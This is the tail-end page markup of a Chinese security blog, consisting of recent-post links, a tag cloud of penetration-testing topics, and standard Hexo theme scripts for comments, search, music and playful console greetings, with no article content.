datetime="2024-08-08T07:36:41.000Z" title="发表于 2024-08-08 15:36:41">2024-08-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/07/thm-qian-ming-gui-bi/" title="THM-签名规避">THM-签名规避</a><time datetime="2024-08-07T09:11:33.000Z" title="发表于 2024-08-07 17:11:33">2024-08-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/05/windows-ti-quan-zong-jie/" title="Windows提权总结">Windows提权总结</a><time datetime="2024-08-05T02:59:37.000Z" title="发表于 2024-08-05 10:59:37">2024-08-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/02/thm-dai-ma-hun-yao-yuan-li/" title="THM-代码混淆原理">THM-代码混淆原理</a><time datetime="2024-08-02T01:46:10.000Z" title="发表于 2024-08-02 09:46:10">2024-08-02</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2020 - 2024 By <a class="footer-bar-link" href="/" title="hybcx" target="_blank">hybcx</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">199</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">23</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">30</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="http://yansedaima.com/" title="颜色代码表"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121908150.svg" alt="颜色代码表"/><span class="back-menu-item-text">颜色代码表</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-box-archive"></use></svg><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shapes"></use></svg><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-tags"></use></svg><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-link"></use></svg><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-artstation"></use></svg><span> 朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-music"></use></svg><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-paper-plane"></use></svg><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shoe-prints1"></use></svg><span> 随便逛逛</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF%E8%B5%9B%E4%BA%8B/" style="font-size: 0.88rem;">CTF赛事<sup>18</sup></a><a href="/tags/CVE/" style="font-size: 0.88rem;">CVE<sup>15</sup></a><a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 0.88rem;">Java反序列化<sup>3</sup></a><a href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 0.88rem;">Java基础<sup>1</sup></a><a href="/tags/Linux%E6%8F%90%E6%9D%83/" style="font-size: 0.88rem;">Linux提权<sup>2</sup></a><a href="/tags/MISC/" style="font-size: 0.88rem;">MISC<sup>1</sup></a><a href="/tags/Metasploit/" style="font-size: 0.88rem;">Metasploit<sup>3</sup></a><a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">PHP代码审计<sup>2</sup></a><a href="/tags/SecBook/" style="font-size: 0.88rem;">SecBook<sup>1</sup></a><a href="/tags/TryHackMe/" style="font-size: 0.88rem;">TryHackMe<sup>36</sup></a><a href="/tags/Windows%E6%8F%90%E6%9D%83/" style="font-size: 0.88rem;">Windows提权<sup>2</sup></a><a href="/tags/reverse%E7%B3%BB%E5%88%97/" style="font-size: 0.88rem;">reverse系列<sup>2</sup></a><a href="/tags/tryhackme/" style="font-size: 0.88rem;">tryhackme<sup>1</sup></a><a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">web渗透<sup>2</sup></a><a href="/tags/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" style="font-size: 0.88rem;">web知识总结<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">代码审计<sup>1</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">内网渗透<sup>3</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">内网靶场<sup>2</sup></a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" style="font-size: 0.88rem;">基本知识<sup>21</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 0.88rem;">基础知识<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 0.88rem;">攻防世界<sup>1</sup></a><a href="/tags/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">玄机应急响应靶场<sup>1</sup></a><a href="/tags/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">红队渗透<sup>1</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="anzhiyufont anzhiyu-icon-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8152976493" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random" volume="0.7"></meting-js></div><div id="algolia-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><button class="search-close-button"><i class="anzhiyufont anzhiyu-icon-xmark"></i></button></nav><div class="search-wrap"><div id="algolia-search-input"></div><hr/><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-info"><div class="algolia-stats"></div><div class="algolia-poweredBy"></div></div></div></div></div><div id="search-mask"></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/medium-zoom@1.1.0/dist/medium-zoom.min.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
var HoldLog = console.log;
console.log = function () {};
let now1 = new Date();
queueMicrotask(() => {
  const Log = function () {
    HoldLog.apply(console, arguments);
  }; //在恢复前输出日志
  const grt = new Date("04/01/2021 00:00:00"); //此处修改你的建站时间或者网站上线时间
  now1.setTime(now1.getTime() + 250);
  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
  const dnum = Math.floor(days);
  const ascll = [
    `欢迎使用安知鱼!`,
    `生活明朗, 万物可爱`,
    `
        
       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
        
        `,
    "已上线",
    dnum,
    "天",
    "©2020 By 安知鱼 V1.6.12",
  ];
  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];

  setTimeout(
    Log.bind(
      console,
      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
      "color:#425AEF",
      "",
      "color:#425AEF",
      "color:#425AEF",
      "",
      "color:#425AEF",
      ""
    )
  );
  setTimeout(
    Log.bind(
      console,
      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
      "color:white; background-color:#4fd953",
      "",
      "",
      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
    )
  );

  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(
      console,
      "%c ⚡ Powered by 安知鱼 %c 你正在访问 hybcx 的博客.",
      "color:white; background-color:#f0ad4e",
      ""
    )
  );

  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
  );
});</script><script async src="/anzhiyu/random.js"></script><script src="https://cdn.cbd.int/algoliasearch@4.18.0/dist/algoliasearch-lite.umd.js"></script><script src="https://cdn.cbd.int/instantsearch.js@4.60.0/dist/instantsearch.production.min.js"></script><script src="/js/search/algolia.js"></script><div class="js-pjax"><script>(() => {
  const initValine = () => {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: '7Sc5uZwcoDwvbgqkpwGKyCpN-gzGzoHsz',
      appKey: 'iEFJUGMm2FY91n9ZG1gdKBSy',
      avatar: 'mp',
      serverURLs: '',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  const loadValine = async () => {
    if (typeof Valine === 'function') initValine()
    else {
      await getScript('https://cdn.cbd.int/valine@1.5.1/dist/Valine.min.js')
      initValine()
    }
  }

  if ('Valine' === 'Valine' || !false) {
    if (false) anzhiyu.loadComment(document.getElementById('vcomment'),loadValine)
    else setTimeout(loadValine, 0)
  } else {
    window.loadOtherComment = loadValine
  }
})()</script><input type="hidden" name="page-type" id="page-type" value="post"></div><script src="https://cdn.cbd.int/blueimp-md5@2.19.0/js/md5.min.js"></script><script>window.addEventListener('load', () => {
  const changeContent = (content) => {
    if (content === '') return content

    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[代码]') // replace code
    content = content.replace(/<[^>]+>/g,"") // remove html tag

    if (content.length > 150) {
      content = content.substring(0,150) + '...'
    }
    return content
  }

  const getIcon = (icon, mail) => {
    if (icon) return icon
    let defaultIcon = '?d=mp'
    let iconUrl = `https://gravatar.loli.net/avatar/${md5(mail.toLowerCase()) + defaultIcon}`
    return iconUrl
  }

  const generateHtml = array => {
    let result = ''

    if (array.length) {
      for (let i = 0; i < array.length; i++) {
        result += '<div class=\'aside-list-item\'>'

        if (true) {
          const name = 'data-lazy-src'
          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'></a>`
        }

        result += `<div class='content'>
        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
        <div class='name'><span>${array[i].nick} / </span><time datetime="${array[i].date}">${anzhiyu.diffDate(array[i].date, true)}</time></div>
        </div></div>`
      }
    } else {
      result += '没有评论'
    }

    let $dom = document.querySelector('#card-newest-comments .aside-list')
    $dom && ($dom.innerHTML= result)
    window.lazyLoadInstance && window.lazyLoadInstance.update()
    window.pjax && window.pjax.refresh($dom)
  }

  const getComment = () => {
    const serverURL = 'https://7Sc5uZwc.api.lncldglobal.com'

    var settings = {
      "method": "GET",
      "headers": {
        "X-LC-Id": '7Sc5uZwcoDwvbgqkpwGKyCpN-gzGzoHsz',
        "X-LC-Key": 'iEFJUGMm2FY91n9ZG1gdKBSy',
        "Content-Type": "application/json"
      },
    }

    fetch(`${serverURL}/1.1/classes/Comment?limit=6&order=-createdAt`,settings)
      .then(response => response.json())
      .then(data => {
        const valineArray = data.results.map(function (e) {
          return {
            'avatar': getIcon(e.QQAvatar, e.mail),
            'content': changeContent(e.comment),
            'nick': e.nick,
            'url': e.url + '#' + e.objectId,
            'date': e.updatedAt,
          }
        })
        saveToLocal.set('valine-newest-comments', JSON.stringify(valineArray), 10/(60*24))
        generateHtml(valineArray)
      }).catch(e => {
        const $dom = document.querySelector('#card-newest-comments .aside-list')
        $dom.textContent= "无法获取评论，请确认相关配置是否正确"
      }) 
  }

  const newestCommentInit = () => {
    if (document.querySelector('#card-newest-comments .aside-list')) {
      const data = saveToLocal.get('valine-newest-comments')
      if (data) {
        generateHtml(JSON.parse(data))
      } else {
        getComment()
      }
    }
  }

  newestCommentInit()
  document.addEventListener('pjax:complete', newestCommentInit)
})</script><script async data-pjax src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.1/bubble/bubble.js"></script><script>var visitorMail = "";
</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><script src="/js/anzhiyu/right_click_menu.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {
  // removeEventListener scroll 
  anzhiyu.removeGlobalFnEvent('pjax')
  anzhiyu.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>